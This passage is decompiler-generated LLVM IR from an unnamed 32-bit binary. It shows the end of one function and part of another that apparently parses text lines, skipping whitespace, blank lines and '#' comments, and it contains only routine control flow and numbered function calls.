  %v0_1000acc8 = load i32, i32* %r16.global-to-local, align 4
  %v3_1000acc8 = icmp eq i32 %v0_1000acc8, 1
  br i1 %v3_1000acc8, label %dec_label_pc_1000acd8, label %dec_label_pc_1000acd0

dec_label_pc_1000acd0:                            ; preds = %dec_label_pc_1000acc8
  %v3_1000acd0 = icmp eq i32 %v0_1000acc8, 28
  br i1 %v3_1000acd0, label %dec_label_pc_1000acd8, label %dec_label_pc_1000ad88

dec_label_pc_1000acd8:                            ; preds = %dec_label_pc_1000ac88.dec_label_pc_1000acd8_crit_edge, %dec_label_pc_1000acd0, %dec_label_pc_1000acc8
  %v1_1000acd8 = phi i32 [ %v1_1000acd8.pre, %dec_label_pc_1000ac88.dec_label_pc_1000acd8_crit_edge ], [ 28, %dec_label_pc_1000acd0 ], [ 1, %dec_label_pc_1000acc8 ]
  %v4_1000acd8 = icmp eq i32 %v3_1000acb0, %v1_1000acd8
  br i1 %v4_1000acd8, label %dec_label_pc_1000acec, label %dec_label_pc_1000ace0

dec_label_pc_1000ace0:                            ; preds = %dec_label_pc_1000acd8
  %v1_1000ace0 = inttoptr i32 %v0_1000acb0 to i32*
  %v2_1000ace0 = load i32, i32* %v1_1000ace0, align 4
  store i32 ptrtoint (i32* @global_var_1000ace8.309 to i32), i32* @lr, align 4
  %v1_1000ace4 = call i32 @function_10007e44(i32 %v2_1000ace0)
  br label %dec_label_pc_1000ad6c

dec_label_pc_1000acec:                            ; preds = %dec_label_pc_1000acd8
  %v1_1000acf0 = add i32 %v0_1000acb0, 16
  %v2_1000acf0 = inttoptr i32 %v1_1000acf0 to i32*
  %v3_1000acf0 = load i32, i32* %v2_1000acf0, align 4
  store i32 %v3_1000acf0, i32* %r11.global-to-local, align 4
  %v1_1000acf4 = add i32 %v0_1000acb0, 32
  %v2_1000acf4 = inttoptr i32 %v1_1000acf4 to i32*
  %v3_1000acf4 = load i32, i32* %v2_1000acf4, align 4
  store i32 %v3_1000acf4, i32* %r0.global-to-local, align 4
  %v0_1000acf8 = load i32, i32* @r24, align 4
  %v2_1000acf8 = sub i32 %tmp35, %v0_1000acf8
  %v1_1000acfc = add i32 %v2_1000acf8, -1
  %v1_1000ad00 = add i32 %v3_1000acf0, 4
  %v2_1000ad04 = mul i32 %v1_1000acfc, %v1_1000ad00
  store i32 %v2_1000ad04, i32* %r11.global-to-local, align 4
  %v2_1000ad08 = add i32 %v0_1000acb0, 36
  %v3_1000ad08 = inttoptr i32 %v2_1000ad08 to i32*
  store i32 %v1_1000acfc, i32* %v3_1000ad08, align 4
  %v0_1000ad0c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ad0c = load i32, i32* %r0.global-to-local, align 4
  %v3_1000ad0c = icmp ugt i32 %v0_1000ad0c, %v1_1000ad0c
  br i1 %v3_1000ad0c, label %dec_label_pc_1000ad88, label %dec_label_pc_1000ad14

dec_label_pc_1000ad14:                            ; preds = %dec_label_pc_1000acec
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000ad1c = load i32, i32* @r31, align 4
  %v2_1000ad1c = add i32 %v1_1000ad1c, 36
  %v3_1000ad1c = inttoptr i32 %v2_1000ad1c to i32*
  store i32 0, i32* %v3_1000ad1c, align 4
  br label %dec_label_pc_1000ad6c

dec_label_pc_1000ad24:                            ; preds = %dec_label_pc_1000ac7c
  %v3_1000ad24 = load i32, i32* %stack_var_-184, align 4
  store i32 268479788, i32* @lr, align 4
  %v1_1000ad28 = call i32 @function_10007e44(i32 %v3_1000ad24)
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_1000ad30 = load i32, i32* %r16.global-to-local, align 4
  %v4_1000ad30 = icmp eq i32 %tmp29, %v1_1000ad30
  br i1 %v4_1000ad30, label %dec_label_pc_1000ad38, label %dec_label_pc_1000ad6c

dec_label_pc_1000ad38:                            ; preds = %dec_label_pc_1000ad24
  %v0_1000ad38 = load i32, i32* @r31, align 4
  %v1_1000ad38 = add i32 %v0_1000ad38, 16
  %v2_1000ad38 = inttoptr i32 %v1_1000ad38 to i32*
  %v3_1000ad38 = load i32, i32* %v2_1000ad38, align 4
  store i32 %v3_1000ad38, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_1000ad40 = icmp eq i32 %v3_1000ad38, %tmp28
  br i1 %v4_1000ad40, label %dec_label_pc_1000ad48, label %dec_label_pc_1000adcc

dec_label_pc_1000ad48:                            ; preds = %dec_label_pc_1000ad38
  %v1_1000ad48 = add i32 %v0_1000ad38, 36
  %v2_1000ad48 = inttoptr i32 %v1_1000ad48 to i32*
  %v3_1000ad48 = load i32, i32* %v2_1000ad48, align 4
  %v1_1000ad4c = add i32 %v0_1000ad38, 28
  %v2_1000ad4c = inttoptr i32 %v1_1000ad4c to i32*
  %v3_1000ad4c = load i32, i32* %v2_1000ad4c, align 4
  store i32 %v3_1000ad4c, i32* %r0.global-to-local, align 4
  %v2_1000ad54 = mul i32 %v3_1000ad48, %tmp28
  %v2_1000ad58 = add i32 %v3_1000ad4c, %v2_1000ad54
  store i32 %v2_1000ad58, i32* @r3, align 4
  store i32 268479840, i32* @lr, align 4
  %v0_1000ad5c = call i32 @function_10006d88()
  %v0_1000ad60 = load i32, i32* @r31, align 4
  %v1_1000ad60 = add i32 %v0_1000ad60, 36
  %v2_1000ad60 = inttoptr i32 %v1_1000ad60 to i32*
  %v3_1000ad60 = load i32, i32* %v2_1000ad60, align 4
  %v1_1000ad64 = add i32 %v3_1000ad60, 1
  store i32 %v1_1000ad64, i32* %v2_1000ad60, align 4
  br label %dec_label_pc_1000ad6c

dec_label_pc_1000ad6c:                            ; preds = %dec_label_pc_1000ad24, %dec_label_pc_1000ad14, %dec_label_pc_1000ace0, %dec_label_pc_1000ad48
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_1000ad48 ], [ 0, %dec_label_pc_1000ad24 ], [ 0, %dec_label_pc_1000ad14 ], [ %stack_var_-88.118, %dec_label_pc_1000ace0 ]
  %v0_1000ad6c = load i32, i32* @r28, align 4
  %v1_1000ad6c = load i32, i32* %r15.global-to-local, align 4
  %v2_1000ad6c = add i32 %v1_1000ad6c, %v0_1000ad6c
  store i32 %v2_1000ad6c, i32* %r28.global-to-local, align 4
  %v0_1000ad70 = load i32, i32* @r24, align 4
  %v1_1000ad70 = add i32 %v0_1000ad70, 1
  store i32 %v1_1000ad70, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_1000ad78 = icmp slt i32 %v1_1000ad70, %tmp35
  br i1 %v2_1000ad78, label %dec_label_pc_1000ad80, label %dec_label_pc_1000ad88

dec_label_pc_1000ad80:                            ; preds = %dec_label_pc_1000ac34, %dec_label_pc_1000ad6c
  %v0_1000ac4c = phi i32 [ %v2_1000ad6c, %dec_label_pc_1000ad6c ], [ %v2_1000ac18, %dec_label_pc_1000ac34 ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_1000ad6c ], [ 1, %dec_label_pc_1000ac34 ]
  %v1_1000ad80 = load i32, i32* @r27, align 4
  %v2_1000ad80 = icmp slt i32 %v0_1000ac4c, %v1_1000ad80
  br i1 %v2_1000ad80, label %dec_label_pc_1000ac44, label %dec_label_pc_1000ad88

dec_label_pc_1000ad88:                            ; preds = %dec_label_pc_1000ac6c, %dec_label_pc_1000ac34, %dec_label_pc_1000ad80, %dec_label_pc_1000acbc, %dec_label_pc_1000acec, %dec_label_pc_1000ad6c, %dec_label_pc_1000acd0
  %v0_1000ad88 = load i32, i32* @r19, align 4
  store i32 268479888, i32* @lr, align 4
  %v1_1000ad8c = call i32 @function_100048e0(i32 %v0_1000ad88)
  %v3_1000ad94 = icmp eq i32 %arg5, 0
  %v0_1000ada4 = load i32, i32* @r30, align 4
  br i1 %v3_1000ad94, label %dec_label_pc_1000ada4, label %dec_label_pc_1000ad9c

dec_label_pc_1000ad9c:                            ; preds = %dec_label_pc_1000ad88
  %v2_1000ad9c = inttoptr i32 %arg5 to i32*
  store i32 %v0_1000ada4, i32* %v2_1000ad9c, align 4
  br label %dec_label_pc_1000adac

dec_label_pc_1000ada4:                            ; preds = %dec_label_pc_1000ad88
  store i32 268479916, i32* @lr, align 4
  %v1_1000ada8 = call i32 @function_10007e44(i32 %v0_1000ada4)
  br label %dec_label_pc_1000adac

dec_label_pc_1000adac:                            ; preds = %dec_label_pc_1000ad9c, %dec_label_pc_1000ada4
  %v0_1000adac = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 268479928, i32* @lr, align 4
  %v1_1000adb4 = call i32 @function_10007e44(i32 %v0_1000adac)
  store i32 ptrtoint (i32* @global_var_10012b0c.297 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000aeb0

dec_label_pc_1000adcc:                            ; preds = %dec_label_pc_1000ad38
  %v1_1000adcc = inttoptr i32 %v0_1000ad38 to i32*
  %v2_1000adcc = load i32, i32* %v1_1000adcc, align 4
  store i32 268479956, i32* @lr, align 4
  %v1_1000add0 = call i32 @function_10007e44(i32 %v2_1000adcc)
  br label %dec_label_pc_1000add4

dec_label_pc_1000add4:                            ; preds = %dec_label_pc_1000abe4, %dec_label_pc_1000ab4c, %dec_label_pc_1000ac6c, %dec_label_pc_1000ac64, %dec_label_pc_1000ab64, %dec_label_pc_1000ab2c, %dec_label_pc_1000adcc
  %v0_1000add4 = load i32, i32* %r17.global-to-local, align 4
  %v3_1000add4 = icmp eq i32 %v0_1000add4, 0
  br i1 %v3_1000add4, label %dec_label_pc_1000addc, label %dec_label_pc_1000ae2c

dec_label_pc_1000addc:                            ; preds = %dec_label_pc_1000add4
  store i32 ptrtoint (i32* @global_var_100103e0.251 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000a8e0, i32* %r28.global-to-local, align 4
  store i32 %v2_1000a8e0, i32* @r3, align 4
  %v0_1000adf8 = call i32 @function_10008c80()
  %v0_1000ae00 = call i32 @function_10008c78()
  %v3_1000ae08 = load i32, i32* @global_var_100104cc.301, align 4
  store i32 %v3_1000ae08, i32* %r29.global-to-local, align 4
  store i32 %v2_1000a8e0, i32* @r3, align 4
  %v0_1000ae14 = call i32 @function_10008c80()
  %v0_1000ae18 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000ae18 = add i32 %v0_1000ae18, -1
  store i32 %v1_1000ae18, i32* %r29.global-to-local, align 4
  %v0_1000ae1c = load i32, i32* @r22, align 4
  %v2_1000ae1c = icmp slt i32 %v0_1000ae1c, %v1_1000ae18
  br i1 %v2_1000ae1c, label %dec_label_pc_1000ae24, label %dec_label_pc_1000ae2c

dec_label_pc_1000ae24:                            ; preds = %dec_label_pc_1000addc
  %v1_1000ae24 = add i32 %v0_1000ae1c, 1
  store i32 %v1_1000ae24, i32* @r22, align 4
  br label %dec_label_pc_1000ae48thread-pre-split.backedge

dec_label_pc_1000ae48thread-pre-split.backedge:   ; preds = %dec_label_pc_1000ae24, %dec_label_pc_1000abcc, %dec_label_pc_1000ae44
  %v0_1000ae48.pr = load i32, i32* %r18.global-to-local, align 4
  %tmp65 = icmp ult i32 %v0_1000ae48.pr, 3
  br i1 %tmp65, label %dec_label_pc_1000a93c.lr.ph, label %dec_label_pc_1000ae60

dec_label_pc_1000ae2c:                            ; preds = %dec_label_pc_1000aadc, %dec_label_pc_1000addc, %dec_label_pc_1000add4, %dec_label_pc_1000aaf4
  %v0_1000ae2c = load i32, i32* @r26, align 4
  %v1_1000ae2c = add i32 %v0_1000ae2c, 1
  store i32 %v1_1000ae2c, i32* %r0.global-to-local, align 4
  %v1_1000ae30 = load i32, i32* @r23, align 4
  %v2_1000ae30 = srem i32 %v1_1000ae2c, %v1_1000ae30
  store i32 %v2_1000ae30, i32* @r26, align 4
  %v5_1000ae38 = icmp eq i32 %v2_1000ae30, 0
  br i1 %v5_1000ae38, label %dec_label_pc_1000ae40, label %dec_label_pc_1000ae44

dec_label_pc_1000ae40:                            ; preds = %dec_label_pc_1000ae2c
  %v0_1000ae40 = load i32, i32* %r18.global-to-local, align 4
  %v1_1000ae40 = add i32 %v0_1000ae40, 1
  store i32 %v1_1000ae40, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_1000ae44

dec_label_pc_1000ae44:                            ; preds = %dec_label_pc_1000ae2c, %dec_label_pc_1000ae40
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_1000ae48thread-pre-split.backedge

dec_label_pc_1000a93c.lr.ph:                      ; preds = %dec_label_pc_1000a93c.lr.ph.lr.ph, %dec_label_pc_1000ae48thread-pre-split.backedge
  br label %dec_label_pc_1000a93c

dec_label_pc_1000ae54:                            ; preds = %dec_label_pc_1000a8b4, %dec_label_pc_1000a8ac, %dec_label_pc_1000a8a4, %dec_label_pc_1000a85c
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_1000ae60

dec_label_pc_1000ae60:                            ; preds = %dec_label_pc_1000ae48thread-pre-split.backedge, %dec_label_pc_1000a94c, %dec_label_pc_1000aa28, %dec_label_pc_1000aaec, %dec_label_pc_1000a8c0, %dec_label_pc_1000ae54
  %v0_1000ae60 = call i32 @function_1000954c()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000ae68 = inttoptr i32 %v0_1000ae60 to i32*
  store i32 -1, i32* %v2_1000ae68, align 4
  %v0_1000ae6c = load i32, i32* @r25, align 4
  store i32 %v0_1000ae6c, i32* @r20, align 4
  br label %dec_label_pc_1000ae70

dec_label_pc_1000ae70:                            ; preds = %dec_label_pc_1000ac0c, %dec_label_pc_1000ae60
  %v0_1000ae70 = load i32, i32* @r19, align 4
  %v3_1000ae70 = icmp eq i32 %v0_1000ae70, -1
  br i1 %v3_1000ae70, label %dec_label_pc_1000ae80, label %dec_label_pc_1000ae78

dec_label_pc_1000ae78:                            ; preds = %dec_label_pc_1000ae70
  store i32 268480128, i32* @lr, align 4
  %v1_1000ae7c = call i32 @function_100048e0(i32 %v0_1000ae70)
  br label %dec_label_pc_1000ae80

dec_label_pc_1000ae80:                            ; preds = %dec_label_pc_1000ae70, %dec_label_pc_1000ae78
  %v0_1000ae80 = load i32, i32* @r21, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268480140, i32* @lr, align 4
  %v1_1000ae88 = call i32 @function_10007e44(i32 %v0_1000ae80)
  %v0_1000ae8c = load i32, i32* @r30, align 4
  store i32 268480148, i32* @lr, align 4
  %v1_1000ae90 = call i32 @function_10007e44(i32 %v0_1000ae8c)
  %v0_1000ae94 = load i32, i32* @r26, align 4
  %v3_1000ae94 = icmp eq i32 %v0_1000ae94, -1
  br i1 %v3_1000ae94, label %dec_label_pc_1000aee0, label %dec_label_pc_1000ae9c

dec_label_pc_1000ae9c:                            ; preds = %dec_label_pc_1000ae80
  store i32 ptrtoint (i32* @global_var_10012b0c.297 to i32), i32* %r29.global-to-local, align 4
  %v2_1000aea8 = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_1000aeb0

dec_label_pc_1000aeb0:                            ; preds = %dec_label_pc_1000adac, %dec_label_pc_1000ae9c
  %storemerge68 = phi i32 [ %v2_1000aea8, %dec_label_pc_1000ae9c ], [ %v2_1000a8e0, %dec_label_pc_1000adac ]
  %v1_1000aeb4.pre-phi = phi i32 [ %v2_1000aea8, %dec_label_pc_1000ae9c ], [ %v2_1000a8e0, %dec_label_pc_1000adac ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  store i32 %v1_1000aeb4.pre-phi, i32* @r3, align 4
  %v0_1000aeb8 = call i32 @function_10008c80()
  %v0_1000aec0 = call i32 @function_10008c78()
  %v0_1000aec8 = load i32, i32* @r26, align 4
  store i32 %v0_1000aec8, i32* @global_var_100104c4.298, align 4
  store i32 %v1_1000aeb4.pre-phi, i32* @r3, align 4
  %v0_1000aed8 = load i32, i32* @r20, align 4
  %v1_1000aed8 = trunc i32 %v0_1000aed8 to i16
  store i16 %v1_1000aed8, i16* @global_var_100103dc.299, align 2
  %v0_1000aedc = call i32 @function_10008c80()
  br label %dec_label_pc_1000aee0

dec_label_pc_1000aee0:                            ; preds = %dec_label_pc_1000ae80, %dec_label_pc_1000aeb0
  store i32 %v0_1000a860, i32* %r0.global-to-local, align 4
  %v0_1000aee4 = load i32, i32* @r27, align 4
  ret i32 %v0_1000aee4

; uselistorder directives
  uselistorder i32 %v1_1000aeb4.pre-phi, { 1, 0 }
  uselistorder i32 %v2_1000ae30, { 1, 0 }
  uselistorder i32 %v0_1000ada4, { 1, 0 }
  uselistorder i32 %v1_1000ad80, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_1000ac4c, { 1, 0 }
  uselistorder i32 %v1_1000ad70, { 1, 0 }
  uselistorder i32 %v0_1000ad38, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000acfc, { 1, 0 }
  uselistorder i32 %v0_1000acb0, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v0_1000ac88, { 2, 1, 0 }
  uselistorder i32 %v0_1000ac24, { 1, 0 }
  uselistorder i32 %v2_1000ac18, { 0, 2, 1, 3 }
  uselistorder i32 %v4_1000ab3c, { 1, 0 }
  uselistorder i32 %v1_1000aa3c, { 1, 0 }
  uselistorder i32 %v1_1000aa10, { 1, 0 }
  uselistorder i32 %v1_1000a9dc, { 1, 0 }
  uselistorder i32 %v1_1000a974, { 1, 0 }
  uselistorder i32 %v2_1000a8e0, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32 %v1_1000a894, { 1, 0 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 19, 20, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7 }
  uselistorder i32* %r18.global-to-local, { 0, 3, 5, 1, 4, 2, 6 }
  uselistorder i32* %r17.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r16.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 14, 4, 5, 6, 9, 7, 8, 10, 11, 12, 13, 0, 15, 17, 34, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10007c04, { 3, 4, 2, 1, 0 }
  uselistorder i32 101, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_10007ba0, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10007cb8, { 2, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 17, { 1, 2, 10, 3, 8, 4, 5, 0, 6, 13, 14, 11, 12, 9, 7 }
  uselistorder i32 (i32)* @function_1000776c, { 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @function_10007064, { 2, 1, 0, 3 }
  uselistorder i32 (i32)* @function_100048e0, { 6, 5, 4, 13, 12, 11, 10, 9, 8, 1, 15, 14, 7, 0, 3, 2 }
  uselistorder i16* @global_var_100103dc.299, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 1, 4, 0 }
  uselistorder i32 (i32)* @function_10007cec, { 5, 4, 6, 3, 2, 7, 8, 1, 0 }
  uselistorder i32 512, { 3, 4, 0, 1, 2, 5, 6, 7 }
  uselistorder label %dec_label_pc_1000aee0, { 1, 0 }
  uselistorder label %dec_label_pc_1000aeb0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae80, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae70, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae60, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_1000a93c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae44, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae2c, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1000ae48thread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000add4, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000adac, { 1, 0 }
  uselistorder label %dec_label_pc_1000ad88, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000ad80, { 1, 0 }
  uselistorder label %dec_label_pc_1000ad6c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000acd8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000ac14, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac0c, { 1, 0 }
  uselistorder label %dec_label_pc_1000aab0, { 1, 0 }
  uselistorder label %dec_label_pc_1000aa28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a94c, { 1, 0 }
}

define i32 @function_1000aef8() local_unnamed_addr {
dec_label_pc_1000aef8:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_1000af14 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_1000af14, i32* @r3, align 4
  %v0_1000af20 = call i32 @function_10008c80()
  store i32 ptrtoint (i32* @global_var_100103e0.251 to i32), i32* %r3.global-to-local, align 4
  %v0_1000af28 = call i32 @function_10008c78()
  store i32 %v0_1000af28, i32* %r3.global-to-local, align 4
  %v3_1000af30 = load i32, i32* @global_var_100104c8.252, align 4
  %v2_1000af34 = icmp sgt i32 %v3_1000af30, 0
  br i1 %v2_1000af34, label %dec_label_pc_1000b1ac, label %dec_label_pc_1000af3c

dec_label_pc_1000af3c:                            ; preds = %dec_label_pc_1000aef8
  store i32 ptrtoint ([17 x i8]* @global_var_1000f338.312 to i32), i32* %r3.global-to-local, align 4
  store i32 268480340, i32* @lr, align 4
  %v3_1000af50 = call i32 @function_10004ca0(i32 ptrtoint ([17 x i8]* @global_var_1000f338.312 to i32), i32 ptrtoint (i32* @global_var_1000f34c.311 to i32))
  store i32 %v3_1000af50, i32* %r3.global-to-local, align 4
  store i32 %v3_1000af50, i32* @r26, align 4
  %v3_1000af54 = icmp eq i32 %v3_1000af50, 0
  br i1 %v3_1000af54, label %dec_label_pc_1000af5c, label %dec_label_pc_1000b170.preheader

dec_label_pc_1000af5c:                            ; preds = %dec_label_pc_1000af3c
  %v0_1000af60 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1000f350.313 to i32), i32* %r3.global-to-local, align 4
  store i32 268480364, i32* @lr, align 4
  %v3_1000af68 = call i32 @function_10004ca0(i32 ptrtoint ([24 x i8]* @global_var_1000f350.313 to i32), i32 %v0_1000af60)
  store i32 %v3_1000af68, i32* %r3.global-to-local, align 4
  store i32 %v3_1000af68, i32* @r26, align 4
  %v3_1000af6c = icmp eq i32 %v3_1000af68, 0
  br i1 %v3_1000af6c, label %dec_label_pc_1000b1a0, label %dec_label_pc_1000b170.preheader

dec_label_pc_1000b170.preheader:                  ; preds = %dec_label_pc_1000af3c, %dec_label_pc_1000af5c
  %v0_1000b17c16 = phi i32 [ %v3_1000af50, %dec_label_pc_1000af3c ], [ %v3_1000af68, %dec_label_pc_1000af5c ]
  %v2_1000b170 = ptrtoint i32* %stack_var_-164 to i32
  %v1_1000af7c2 = bitcast i32* %stack_var_-164 to i8*
  %v3_1000b060 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_1000b170

dec_label_pc_1000af78:                            ; preds = %dec_label_pc_1000af90
  %v1_1000af78 = add i32 %v0_1000b0389, 1
  store i32 %v1_1000af78, i32* %r3.global-to-local, align 4
  %v1_1000af7c = inttoptr i32 %v1_1000af78 to i8*
  %v2_1000af7c = load i8, i8* %v1_1000af7c, align 1
  %v3_1000af7c = zext i8 %v2_1000af7c to i32
  store i32 %v3_1000af7c, i32* %r11.global-to-local, align 4
  %v3_1000af84 = icmp eq i8 %v2_1000af7c, 0
  br i1 %v3_1000af84, label %dec_label_pc_1000b170.backedge, label %dec_label_pc_1000af90

dec_label_pc_1000af90:                            ; preds = %dec_label_pc_1000af90.lr.ph, %dec_label_pc_1000af78
  %v0_1000af94.in = phi i32 [ %v3_1000af7c4, %dec_label_pc_1000af90.lr.ph ], [ %v3_1000af7c, %dec_label_pc_1000af78 ]
  %v0_1000afa8 = phi i32 [ %v3_1000af7c4, %dec_label_pc_1000af90.lr.ph ], [ %v3_1000af7c, %dec_label_pc_1000af78 ]
  %v0_1000b0389 = phi i32 [ %v2_1000b170, %dec_label_pc_1000af90.lr.ph ], [ %v1_1000af78, %dec_label_pc_1000af78 ]
  %v0_1000af94 = mul nuw nsw i32 %v0_1000af94.in, 2
  %v2_1000af94 = add i32 %v0_1000af94, %v3_1000af90.pre
  %v3_1000af94 = inttoptr i32 %v2_1000af94 to i16*
  %v4_1000af94 = load i16, i16* %v3_1000af94, align 2
  %v1_1000af98 = and i16 %v4_1000af94, 32
  %v3_1000af98 = icmp eq i16 %v1_1000af98, 0
  br i1 %v3_1000af98, label %dec_label_pc_1000afa0, label %dec_label_pc_1000af78

dec_label_pc_1000afa0:                            ; preds = %dec_label_pc_1000af90
  %v3_1000afa0 = icmp eq i32 %v0_1000afa8, 10
  br i1 %v3_1000afa0, label %dec_label_pc_1000b170.backedge, label %dec_label_pc_1000afa8

dec_label_pc_1000b170.backedge:                   ; preds = %dec_label_pc_1000af78, %dec_label_pc_1000b124, %dec_label_pc_1000b12c, %dec_label_pc_1000b164, %dec_label_pc_1000af7c.preheader, %dec_label_pc_1000afa0, %dec_label_pc_1000afa8, %dec_label_pc_1000b0cc
  %v0_1000b17c.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_1000b170

dec_label_pc_1000afa8:                            ; preds = %dec_label_pc_1000afa0
  %v3_1000afa8 = icmp eq i32 %v0_1000afa8, 35
  br i1 %v3_1000afa8, label %dec_label_pc_1000b170.backedge, label %dec_label_pc_1000afb0

dec_label_pc_1000afb0:                            ; preds = %dec_label_pc_1000afa8
  store i32 0, i32* @r27, align 4
  store i32 %v2_1000af14, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1000b03810 = inttoptr i32 %v0_1000b0389 to i8*
  %v2_1000b03811 = load i8, i8* %v1_1000b03810, align 1
  %v3_1000b03c14 = icmp eq i8 %v2_1000b03811, 0
  br i1 %v3_1000b03c14, label %dec_label_pc_1000b04c, label %dec_label_pc_1000b044

dec_label_pc_1000afc4:                            ; preds = %dec_label_pc_1000b044
  %v3_1000afc4 = load i32, i32* @global_var_1001044c, align 4
  store i32 %v3_1000afc4, i32* %r11.global-to-local, align 4
  %v1_1000afc8 = mul i32 %v0_1000afc8, 4
  %v1_1000afcc = load i32, i32* %r6.global-to-local, align 4
  %v2_1000afcc = add i32 %v1_1000afcc, %v1_1000afc8
  %v2_1000afd0 = add i32 %v2_1000afcc, 16
  %v3_1000afd0 = inttoptr i32 %v2_1000afd0 to i32*
  store i32 %v0_1000afd0, i32* %v3_1000afd0, align 4
  %v0_1000afdc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000afdc

dec_label_pc_1000afd8:                            ; preds = %dec_label_pc_1000aff0
  %v1_1000afd8 = add i32 %v0_1000afd8, 1
  store i32 %v1_1000afd8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000afdc

dec_label_pc_1000afdc:                            ; preds = %dec_label_pc_1000afc4, %dec_label_pc_1000afd8
  %v0_1000afd8 = phi i32 [ %v0_1000afdc.pre, %dec_label_pc_1000afc4 ], [ %v1_1000afd8, %dec_label_pc_1000afd8 ]
  %v1_1000afdc = inttoptr i32 %v0_1000afd8 to i8*
  %v2_1000afdc = load i8, i8* %v1_1000afdc, align 1
  %v3_1000afe0 = icmp eq i8 %v2_1000afdc, 0
  br i1 %v3_1000afe0, label %dec_label_pc_1000b00c, label %dec_label_pc_1000aff0

dec_label_pc_1000aff0:                            ; preds = %dec_label_pc_1000afdc
  %v3_1000afe8 = icmp eq i8 %v2_1000afdc, 10
  %v3_1000afdc = zext i8 %v2_1000afdc to i32
  %v1_1000afe4 = mul nuw nsw i32 %v3_1000afdc, 2
  %v1_1000aff0 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000aff0 = add i32 %v1_1000aff0, %v1_1000afe4
  %v3_1000aff0 = inttoptr i32 %v2_1000aff0 to i16*
  %v4_1000aff0 = load i16, i16* %v3_1000aff0, align 2
  %v1_1000aff4 = and i16 %v4_1000aff0, 32
  %v3_1000aff4.not = icmp ne i16 %v1_1000aff4, 0
  %brmerge = or i1 %v3_1000afe8, %v3_1000aff4.not
  br i1 %brmerge, label %dec_label_pc_1000b00c, label %dec_label_pc_1000afd8

dec_label_pc_1000b004:                            ; preds = %dec_label_pc_1000b020
  %v0_1000b004 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000b004 = trunc i32 %v0_1000b004 to i8
  store i8 %v1_1000b004, i8* %v1_1000b00c, align 1
